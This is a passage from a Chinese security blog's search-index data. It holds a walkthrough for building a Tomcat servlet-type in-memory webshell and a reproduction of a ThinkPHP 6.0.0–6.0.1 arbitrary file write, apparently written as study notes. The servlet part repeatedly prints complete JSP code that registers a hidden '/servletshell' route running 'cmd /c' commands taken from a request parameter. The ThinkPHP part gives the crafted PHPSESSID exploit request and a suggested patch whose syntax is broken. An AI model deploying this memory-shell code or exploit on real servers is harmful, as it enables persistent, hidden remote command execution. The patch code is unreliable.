appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //注入listener    standardContext.addApplicationEventListener(new Testlistener());%&gt;\n\n","categories":["学习"]},{"title":"Tomcat内存马—servlet型","url":"/2023/06/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94servlet%E5%9E%8B/","content":"前言开学鸽了一段时间，现在重新把内存马拿起来\n正文servlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet\n打好断点，开始调试，看看在哪进行的实例化\n调试发现，实例化是在DefaultInstanceManager#newInstance 中进行的，继续向前追踪 clazz 的来源\n这里也就知道了上文中的 clazz 其实就是 StandardWrapper.servletClass ，再继续追踪来源的时候，我看到StandardWrapperValve 中的 context ，也就是 StandardContext 有一个 children 属性\n直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 StandardContext 有一个 addServlet 方法\n不过并没有具体实现，但是我们在其子类ApplicationContext 中找到了实现流程\n先判断状态，然后调用 createWrapper 方法去封装 servlet ，接着调用 addChild 方法将其添加到 children 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo\n&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Servletshell extends HttpServlet &#123;        @Override        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            String cmd=req.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                Writer writer=resp.getWriter();                writer.write(new String(baos.toByteArray()));                writer.flush();            &#125;        &#125;        @Override        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            super.doPost(req, resp);        &#125;    &#125;%&gt;&lt;%    //获取context    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //修改状态    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);    state.setAccessible(true);    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);    //尝试注入    String servletName=&quot;servletShell&quot;;    String servletClass=&quot;servletShell.class&quot;;    Class serletC=Servletshell.class;    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);    //addServlet.setAccessible(true);    addServlet.invoke(applicationContext,servletName,serletC);    System.out.println(standardContext.findChildren());%&gt;\n\n\n\n可以看到我们自定义的servlet已经插入到 children 里了，不过还有一个问题，这没有匹配的路由啊\n所以我们还得想办法将路由对应到 servlet-name\n可以看到有 addServletMapping 方法，试试看\n&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Servletshell extends HttpServlet &#123;        @Override        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            String cmd=req.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                Writer writer=resp.getWriter();                writer.write(new String(baos.toByteArray()));                writer.flush();            &#125;        &#125;        @Override        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            super.doPost(req, resp);        &#125;    &#125;%&gt;&lt;%    //获取context    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //修改状态    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);    state.setAccessible(true);    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);    //尝试注入    String servletName=&quot;servletShell&quot;;    String urlpattern=&quot;/servletshell&quot;;    Class serletC=Servletshell.class;    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);    addServlet.invoke(applicationContext,servletName,serletC);    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);    addServletMapping.invoke(standardContext,urlpattern,servletName);    System.out.println(standardContext.findChildren());%&gt;\n\n\n\n可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的\n不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码\nif(state!=null)&#123;        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);    &#125;\n\n不过，访问变成了404\n现在来分析一下为啥没有正常访问到，在 ApplicationFilterChain#`internalDoFilter 中调用 servlet 的 service` 方法处打个断点\n可以看到这里获取到的是 DefaultServlet ，而不是我们注入的 ServletShell ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 setServlet 方法进行赋值的，在该方法处打个断点\n在ApplicationFilterFactor#createFilterChain方法中调用该方法进行赋值\n继续往前追踪，在StandardWrapperValv#invoke可以看到\nservlet是 wrapper.allocate 的返回值，跟进一下这个方法\n简单看一下可知，这里是返回了 instance 属性的值，那么此时我们要继续追寻 instance 属性的来源，直接看一下 wrapper 是咋来的\n跟进 getContainer\n对应的赋值方法为 setContainer ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的StandardContextValve#invoke\n可以看到wrapper已经被赋值了，该 wrapper是从 request中获取的，那么我们又要继续追溯 request 对象的来源了，看到org.apache.catalina.connector.CoyoteAdapter#service\n这里获取了 request 对象，然后在下面调用了postParseRequest 处理\n跟进\n这里算是一个关键地方，后面就是map方面的操作了\n跟踪到这里，也就是org.apache.catalina.mappe.Mapper#internalMap的时候，发现了一个关键的属性 contextVersion\n可以看到 contextVersion中的 exactWrappers 中存储了我们自定义的其他两个servlet的 wrapper ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 addWrapper 方法\n要使用这个方法，我们就需要获取到 contextVersion ，还要创建一个自定义的 wrapper\n先解决第一个问题 — 获取 contextVersion\n无意之间看到了这么一行代码\n然后去看了看 contextObjectToContextVersionMap\n里面果然存储了 contextVersion ，那么我们也就可以通过这个属性获取到 contextVersion,那么现在的问题就变成了获取contextObjectToContextVersionMap ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点\n这里先获取到service属性在调用 getMapper 获取到 mapper 对象，那么我们现在就要想办法去获取到这个 StandardService ，后面调试了半天，到处追踪，终于看到了希望\n可以看到在 ApplicationContext 中有 service 这个属性，而 ApplicationContext 我们已经能够获取到了，所以问题圆满解决。\n//获取service属性    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);    servicef.setAccessible(true);    StandardService service=(StandardService) servicef.get(applicationContext);    //获取mapper    Mapper mapper=service.getMapper();    //获取contextVersion    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);    contextObjectToContextVersionMapf.setAccessible(true);    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);    //调用addWrapper方法    Class[] classes=mapper.getClass().getDeclaredClasses();    Class classt=classes[1];    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);    addWrapper.setAccessible(true);    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);    System.out.println(&quot;ook&quot;);\n\n继续看第二个问题 — 创建自定义 wrapper\n在 StandardContext中，存在 createWrapper 方法，我们可以通过该方法来创建自定义的 wrapper\n//创建自定义wrapper    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();    shellWrapper.setServlet(shell);    shellWrapper.setServletClass(shell.getClass().getName());\n\n然后我们组合一下\n&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Servletshell extends HttpServlet &#123;        @Override        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            String cmd=req.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                Writer writer=resp.getWriter();                writer.write(new String(baos.toByteArray()));                writer.flush();            &#125;        &#125;        @Override        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            super.doPost(req, resp);        &#125;    &#125;%&gt;&lt;%    //获取context    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //修改状态    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);    state.setAccessible(true);    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);    //尝试注入    String servletName=&quot;ServletShell&quot;;    String urlpattern=&quot;/servletshell&quot;;    Class serletC=Servletshell.class;    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);    addServlet.invoke(applicationContext,servletName,serletC);    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);    addServletMapping.invoke(standardContext,urlpattern,servletName);    Servletshell shell=new Servletshell();    //创建自定义wrapper    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();    shellWrapper.setServlet(shell);    shellWrapper.setServletClass(shell.getClass().getName());    //shellWrapper.addMapping(&quot;/servletshell&quot;);    //获取service属性    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);    servicef.setAccessible(true);    StandardService service=(StandardService) servicef.get(applicationContext);    //获取mapper    Mapper mapper=service.getMapper();    //获取contextVersion    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);    contextObjectToContextVersionMapf.setAccessible(true);    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);    //调用addWrapper方法    Class[] classes=mapper.getClass().getDeclaredClasses();    Class classt=classes[1];    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);    addWrapper.setAccessible(true);    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);    System.out.println(&quot;ook&quot;);    if(state!=null)&#123;        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);    &#125;%&gt;\n\n\n\n但是访问还是报500，看一下是否将wrapper正确添加了\n可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 parent 属性\nshellWrapper.setParent(standardContext);\n\n添加这一行即可，修改后的poc\n&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Servletshell extends HttpServlet &#123;        @Override        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            String cmd=req.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                Writer writer=resp.getWriter();                writer.write(new String(baos.toByteArray()));                writer.flush();            &#125;        &#125;        @Override        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            super.doPost(req, resp);        &#125;    &#125;%&gt;&lt;%    //获取context    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //修改状态    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);    state.setAccessible(true);    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);    //尝试注入    String servletName=&quot;ServletShell&quot;;    String urlpattern=&quot;/servletshell&quot;;    Class serletC=Servletshell.class;    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);    addServlet.invoke(applicationContext,servletName,serletC);    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);    addServletMapping.invoke(standardContext,urlpattern,servletName);    Servletshell shell=new Servletshell();    //创建自定义wrapper    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();    shellWrapper.setServlet(shell);    shellWrapper.setServletClass(shell.getClass().getName());    shellWrapper.setParent(standardContext);    //shellWrapper.addMapping(&quot;/servletshell&quot;);    //获取service属性    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);    servicef.setAccessible(true);    StandardService service=(StandardService) servicef.get(applicationContext);    //获取mapper    Mapper mapper=service.getMapper();    //获取contextVersion    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);    contextObjectToContextVersionMapf.setAccessible(true);    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);    //调用addWrapper方法    Class[] classes=mapper.getClass().getDeclaredClasses();    Class classt=classes[1];    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);    addWrapper.setAccessible(true);    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);    System.out.println(&quot;ook&quot;);    if(state!=null)&#123;        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);    &#125;%&gt;\n\n\n\n成功注入\n后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc\n&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Servletshell extends HttpServlet &#123;        @Override        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            String cmd=req.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                Writer writer=resp.getWriter();                writer.write(new String(baos.toByteArray()));                writer.flush();            &#125;        &#125;        @Override        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;            super.doPost(req, resp);        &#125;    &#125;%&gt;&lt;%    //获取context    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);      //创建自定义wrapper    Servletshell shell=new Servletshell()    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();    shellWrapper.setServlet(shell);    shellWrapper.setServletClass(shell.getClass().getName());    shellWrapper.setParent(standardContext);    //获取service属性    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);    servicef.setAccessible(true);    StandardService service=(StandardService) servicef.get(applicationContext);    //获取mapper    Mapper mapper=service.getMapper();    //获取contextVersion    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);    contextObjectToContextVersionMapf.setAccessible(true);    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);    //调用addWrapper方法    Class[] classes=mapper.getClass().getDeclaredClasses();    Class classt=classes[1];    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);    addWrapper.setAccessible(true);    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);%&gt;\n\n简短了很多\n总结在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。\n","categories":["学习"]},{"title":"thinkphp6任意文件写入","url":"/2022/11/13/thinkphp6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/","content":"thinkphp6任意文件写入漏洞复现过程###tips\n仅适用于thinkphp6.0.0~6.0.1\n一.搭建环境这里踩了很多坑，最终供选择用phpstudy来搭建环境\n1.安装phpstudy直接在官网下载即可\n链接：https://www.xp.cn/download.html\n2.安装composer\n值得注意的是我们这里用的composer的版本是1.8.5\n在安装tp6的时候可能会报错，我们需要去更新\ncomposer self-update//更新版本\n\n3.创建站点4.安装tp6点击管理中的composer，点击确定\ncomposer create-project topthink/think tp6    //安装tp6\n\n\n\n\n访问成功\n\n二.漏洞利用1.分析首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。\n漏洞首先出现的地方是 sessionid可控tp6/vendor/topthink/framework/src/think/session/Store.php121行\n$this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());\n\nsessionid在设置的时候为进行校验，只要是32位就可以\n然后再看看同一个文件的session保存\ntp6/vendor/topthink/framework/src/think/session/Store.php\n254行\npublic function save(): void   &#123;       $this-&gt;clearFlashData();       $sessionId = $this-&gt;getId();       if (!empty($this-&gt;data)) &#123;           $data = $this-&gt;serialize($this-&gt;data);           $this-&gt;handler-&gt;write($sessionId, $data);       &#125; else &#123;           $this-&gt;handler-&gt;delete($sessionId);       &#125;       $this-&gt;init = false;   &#125;\n\n先获取session id 然后是 $this-&gt;handler-&gt;write($sessionId, $data);; 在跟进一下handler 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler\npublic function __construct($name, SessionHandlerInterface $handler, array $serialize = null)    &#123;        $this-&gt;name    = $name;        $this-&gt;handler = $handler;        if (!empty($serialize)) &#123;            $this-&gt;serialize = $serialize;        &#125;        $this-&gt;setId();    &#125;\n\n tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php 这里获取到 PHPSESSID 的值 session id传入\nif ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;          $sessionId = $request-&gt;request($varSessionId);      &#125; else &#123;          $sessionId = $request-&gt;cookie($cookieName);      &#125;      if ($sessionId) &#123;          $this-&gt;session-&gt;setId($sessionId);\n\n$request-&gt;cookie($cookieName);这个里面看一下protected $name = &#x27;PHPSESSID&#x27;; 发现是这个参数//所以这个值就从PHPSESSID传就好了\n\n然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方\n最后保存session数据 在代码tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php 跟进这个write方法\n$this-&gt;handler-&gt;write($sessionId, $data);//这里的 handler 是  继承的think\\session\\driver\\file.php\n\n跟进这个write方法 tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php\npublic function write(string $sessID, string $sessData): bool    &#123;        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        return $this-&gt;writeFile($filename, $data);    &#125;\n\n文件名处理方式\ngetFileName($sessID, true);\n\nprotected function getFileName(string $name, bool $auto = false): string    &#123;        if ($this-&gt;config[&#x27;prefix&#x27;]) &#123;            // 使用子目录            $name = $this-&gt;config[&#x27;prefix&#x27;] . DIRECTORY_SEPARATOR . &#x27;sess_&#x27; . $name;        &#125; else &#123;            $name = &#x27;sess_&#x27; . $name;        &#125;        $filename = $this-&gt;config[&#x27;path&#x27;] . $name;        $dir      = dirname($filename);        if ($auto &amp;&amp; !is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\\Exception $e) &#123;                // 创建失败            &#125;        &#125;        return $filename;    &#125;\n\n由此可知，文件名只进行了路径拼接和加前缀\n跟进 $this-&gt;writeFile($filename, $data);\nprotected function writeFile($path, $content): bool   &#123;       return (bool) file_put_contents($path, $content, LOCK_EX);   &#125;\n\n这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容\n2.利用直接用burpsuite先抓一个包\nGET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1Host: tp6.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53Upgrade-Insecure-Requests: 1\n\n这里我们通过修改PHPSESSID来进行利用，\n值得注意的是这里我们构造的长度必须是**32**位\nPHPSESSID=1234567890123456789012345678.php\n\n一般位于项目根目录下的.&#x2F;runtime&#x2F;session&#x2F;文件夹下， 加上之前前缀的拼接，那就是 &#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php\n\n成功！\n3.修复方法这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用ctype_alnum函数\n\nPHP ctype_alnum()函数 (PHP ctype_alnum() function)ctype_alnum() function is a character type (CType) function in PHP, it is used to check whether a given string contains alphanumeric characters or not.\nctype_alnum()函数是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 \nIt returns true – if the string contains alphanumeric value (i.e. alphabets, digits&#x2F;number only), else it returns false.\n它返回true -如果字符串包含字母数字值(即字母，数字只&#x2F;数字)，否则返回FALSE。 \n\n修改如下\n$this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ctype_alnum（$id） &amp;&amp; ? $id : md5(microtime(true) . session_create_id());","categories":["复现"]},{"title":"web漏洞复习","url":"/2022/03/10/web%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0/","content":"web漏洞复习1.owasp top 